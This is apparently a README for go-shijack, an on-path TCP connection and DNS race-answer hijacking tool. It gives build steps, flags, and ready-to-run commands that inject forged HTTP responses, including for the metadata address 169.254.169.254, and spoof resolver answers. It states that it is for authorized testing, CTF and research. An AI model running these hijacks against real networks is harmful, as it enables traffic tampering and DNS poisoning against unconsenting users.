# go-shijack

on-path TCP/UDP connection hijacker. A Go rewrite of [shijack](https://packetstormsecurity.com/files/24657/shijack.tgz.html) (2001), extended with DNS/UDP race-answer hijacking.

> ⚠️ For authorized security testing, CTF, and research only. You must be on-path to the traffic, in the network namespace where it flows, and hold `CAP_NET_RAW`.

## how it works

go-shijack sniffs packets on a local interface and injects forged replies that race the real server's response.

- **TCP mode** (`--protocol tcp`, default): hijacks an existing TCP stream. Sniffs ACKs from the impersonated server, then injects a TCP segment using the captured `Seq/Ack` so it lands inside the live connection. "HTTP hijack" is just injecting bytes that happen to be an HTTP response.
- **DNS mode** (`--protocol dns`): races a UDP resolver. Sniffs DNS queries (`dst host <resolver> and dst port 53`), then forges a `resolver:53 → client:ephemeral` UDP reply with a matching transaction ID, beating the real resolver to the client.

## prerequisites

- **on-path** to the traffic you want to hijack (same L2 segment, or a router/gateway between victim and server).
- in the **network namespace** where that traffic flows (raw socket and pcap are per-netns; in a container, use `--net=host`).
- hold **`CAP_NET_RAW`** .

## build

```bash
make go-shijack                      # local static binary
make container                       # docker image ssst0n3/go-shijack
CGO_ENABLED=0 go install github.com/ssst0n3/go-shijack/cmd/go-shijack@v0.1.0   # remote install
```

## flags

**common**

| flag | alias | meaning |
|------|-------|---------|
| `--interface` | `-t` | capture/inject interface |
| `--protocol` | `--proto` | `tcp` (default) or `dns` |
| `--ip` | `-i` | TCP: impersonated server · DNS: resolver |
| `--port` | `-p` | TCP: server port · DNS: resolver port (usually 53) |
| `--keep` | `-k` | keep hijacking; otherwise hijack once and exit |

**TCP**

| flag | alias | meaning |
|------|-------|---------|
| `--payload-file` | `-f` | bytes to inject (required) |

**DNS**

| flag | alias | meaning |
|------|-------|---------|
| `--dns-domain` | — | domain to answer (auto-construct A record) |
| `--dns-ip` | — | A record IP to return |
| `--payload-file` | `-f` | raw DNS response bytes (TXID rewritten per query) |

> DNS mode needs the forged answer: `--dns-domain`+`--dns-ip` or `--payload-file`.

## usage — TCP (http)

### 1. write response file

A valid HTTP response, no leading blank line, `Content-Length` matching the body:

```bash
cat > flag <<'EOF'
HTTP/1.1 200 OK
Content-Length: 9

flag{test}
EOF
```

### 2. hijack

binary:

```bash
./go-shijack -t eth0 -i 169.254.169.254 -p 80 -f flag -k &
curl http://169.254.169.254   # flag{test}
```

container:

```bash
docker run -d --net=host --rm -v $(pwd):/data ssst0n3/go-shijack:v0.1 \
  -t eth0 -i 169.254.169.254 -p 80 -f /data/flag -k
curl http://169.254.169.254   # flag{test}
```

## usage — DNS

`-i`/`-p` are the resolver's IP and port (usually 53). Two ways to supply the answer.

### auto-construct (A record)

```bash
./go-shijack -t eth0 -i 8.8.8.8 -p 53 --protocol dns \
  --dns-domain example.com --dns-ip 1.2.3.4 -k &
dig @8.8.8.8 example.com +short   # 1.2.3.4
```

### raw response file (any record type)

`-f` must be **raw DNS message bytes** (TXID at offset 0, rewritten per query) — not a pcap. Capture one reply and strip the wire headers, e.g. with tshark:

```bash
tshark -i eth0 -c 1 -w resp.pcap 'src 8.8.8.8 and udp and port 53'
tshark -r resp.pcap -T fields -e data | xxd -r -p > resp.bin
./go-shijack -t eth0 -i 8.8.8.8 -p 53 --protocol dns -f resp.bin -k &
```

## bpf

### method 1

Use the predefined pattern; just provide host and port to go-shijack (works for both TCP and DNS).

### TODO: method 2

Compile the filter manually, e.g.:

```bash
tcpdump ip -d -s 65536 host 169.254.169.254
```

## related projects

* [rshijack](https://github.com/kpcyrd/rshijack) — Rust rewrite
* [shijack](https://packetstormsecurity.com/files/24657/shijack.tgz.html) — 2001 original
